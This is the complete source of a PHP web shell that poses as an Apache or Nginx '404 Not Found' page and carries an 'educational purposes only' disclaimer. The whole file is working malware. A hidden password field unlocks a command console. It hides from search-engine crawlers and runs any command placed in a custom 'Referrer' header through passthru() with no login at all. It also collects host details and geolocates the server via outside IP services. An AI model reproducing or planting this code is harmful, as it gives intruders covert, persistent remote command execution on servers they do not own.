<?php

/**
 * This code has been developed for educational purposes only.
 * Any action and/or activity related to the material contained herein is your sole responsibility.
 * Misuse may result in criminal charges being brought against the individuals concerned.
 */

// =========== Configuration ===========

@session_start();
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

// =========== Passphrase ===========

$passphrase = "136c757bdd877848762c248e58252935"; // cosasdepuma

if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) === $passphrase))) {
    $_SESSION[md5($_SERVER['REMOTE_ADDR'])] = true;
}

// =========== Headers ===========

header('HTTP/1.0 404 Not Found');
header('Server: '.$_SERVER['SERVER_SOFTWARE']);
header('X-Powered-By: Unicorns and pumas <3');

// =========== Anti-Robots ===========

$robots = array('Baiduspider','Bing','DuckDuck','Google','ia_archiver','MSNBot','Rambler','Slurp','Sogou','Yandex');
foreach($robots as $robot)
    if(strpos($_SERVER['HTTP_USER_AGENT'], $robot) !== false)
        exit(0);

// =========== PHP Info ===========

if(isset($_GET['p'])) { phpinfo(); die(); }

// =========== Shell ===========

if(!empty($_SERVER['HTTP_REFERRER']) && !str_starts_with($_SERVER['HTTP_REFERRER'],'http')) {
    passthru($_SERVER["HTTP_REFERRER"]); die();
}

// =========== Close ===========

if(isset($_GET['c'])) {
    unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
    session_destroy();
    header("Location: " . explode("?", $_SERVER['REQUEST_URI'])[0], true, 302);
    die();
}

// =========== Information ===========

/***
 * Get information about the target
 */
function get_info() {
    $user = explode('\\',@shell_exec('whoami'));
    $GLOBALS['_info'] = array(
        'user'     => end($user),
        'system'   => substr(@php_uname('s'),0,20).'/'.substr(@php_uname('r'),0,20),
        'software' => explode(' ',$_SERVER['SERVER_SOFTWARE'])[0],
        'php'      => 'PHP/'.phpversion(),
    );
    $GLOBALS['_actions'] = array(
        'PHP Info'            => '?p',
        'Geolocate'           => 'https://www.google.es/maps/place/'.file_get_contents('http://ip-api.com/csv/'.trim(file_get_contents("https://ipinfo.io/ip"))."?fields=lat,lon"),
        'Exploit-DB (PHP)'    => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['php']))[0],
        'Exploit-DB (Server)' => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['software']))[0],
        'Exploit-DB (System)' => 'https://www.exploit-db.com/search?q='.explode('.',str_replace('/','+',$GLOBALS['_info']['system']))[0],
        'Log out'             => '?c',
    );
}

// =========== Templates ===========

/**
 * Apache 404 Template
 */
function tpl_apache() { ?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address><div><input style="display:none;" type="password" autocomplete="foo" /><form method="POST"><input style="border:0;outline:0" type="password" name="passwd" autocomplete="foo"></form></div></body></html><?php }

/**
 * Nginx 404 Template
 */
function tpl_nginx() { ?><html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center><?=$_SERVER['SERVER_SOFTWARE']?></center><div><input style="display:none;" type="password" autocomplete="foo" /><form method="POST"><input style="border:0;outline:0" type="password" name="passwd" autocomplete="foo"></form></div></body></html><?php }

/**
 * Dashboard
 */
function tpl_dashboard() { ?><!DOCTYPE html><html><head><title>SecurityNotFound</title><link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"> <meta charset="UTF-8"><style>*{padding:0;margin:0;outline:0;box-sizing:border-box;background:#333;color:#ddd;border-block:0;border-inline:0}body,html{height:100%;font-family:monospace}body{background:#ddd;display:flex;justify-content:center;align-items:center;flex-direction:column;padding:10px}header{width:100%;padding:10px 20px;position:relative;display:flex;justify-content:space-between;align-items:center;z-index:1}header::after,header::before{content:'';position:absolute;top:100%;border-width:10px;border-style:solid;border-color:#333 #333 transparent transparent}header::after{left:0}header::before{right:0;border-color:#333 transparent transparent #333}li{text-transform:lowercase;list-style:none;display:inline-block;padding:5px 10px;margin:0 5px;background:tomato;color:#333;font-weight:700;font-size:10px;border-radius:0 5px 0 5px}aside{padding:0 25px;margin-top:-5px;background:0 0}aside,main{width:100%}main{background:grey;padding:10px;display:grid;grid-template-columns:9fr 3fr}.c,.t,section{border:1px solid grey}.c{padding:0}section{padding:10px}.d{display:grid;grid-template-columns:1fr 40px}.t{background:tomato;text-align:center;font-weight:700;color:#333;margin-bottom:5px;text-transform:uppercase;padding:5px}textarea{min-height:300px;scrollbar-width:none;-ms-overflow-style:none;white-space:pre-wrap}textarea::-webkit-scrollbar{display:none}input,textarea{width:100%;width:100%;padding:5px;border:1px solid grey}input{background:#444;border-top:0}button{border:1px solid gray;background:#333;text-align:center;color:#333;display:inline-block}button:hover{background:#222;cursor:pointer}a{text-decoration:none;text-align:center;padding:5px;display:inline-block;width:100%;margin:2px;border:1px solid gray}a:hover{background:#222}</style></head><body><header><h2>Err404 :: SecurityNotFound</h2><div><?php foreach($GLOBALS['_info'] as $k=>$v) echo('<li>'.$v.'</li>') ?></div></header><aside><main><section><div class="t">🎮 Console 🎮</div><div class="c"><textarea readonly id="d"></textarea><div class="d"><form onsubmit="return f()"><input id="s" placeholder="command..."></form><button onclick="return z()">🧹</button></div></div></section><section><div class="t">🔌 Actions 🔌</div><div class="c"><?php foreach($GLOBALS['_actions'] as $k=>$v) echo('<a href="'.$v.'">'.$k.'</a>') ?></div></section></main></aside><script>var n='_logs';var t = document.getElementById('d');var u=()=>{t.innerHTML=(localStorage.getItem(n)||'').trimEnd();t.scrollTop=t.scrollHeight};var z=()=>{localStorage.removeItem(n);u();return false};var f=()=>{c=document.getElementById('s').value;fetch(location.pathname,{referrer:'',headers:new Headers({'Referrer':c})}).then(r=>r.text()).then((r)=>{var l=localStorage.getItem(n)||'';localStorage.setItem(n,l+`$ ${c}\n${r}\n\n`);u()});return false};</script></body></html><?php }

// =========== Entrypoint ===========

if(isset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]) && $_SESSION[md5($_SERVER['REMOTE_ADDR'])]) { get_info(); tpl_dashboard(); }
else if(!substr_compare('n',$_SERVER['SERVER_SOFTWARE'],0,1)) tpl_nginx();
else tpl_apache();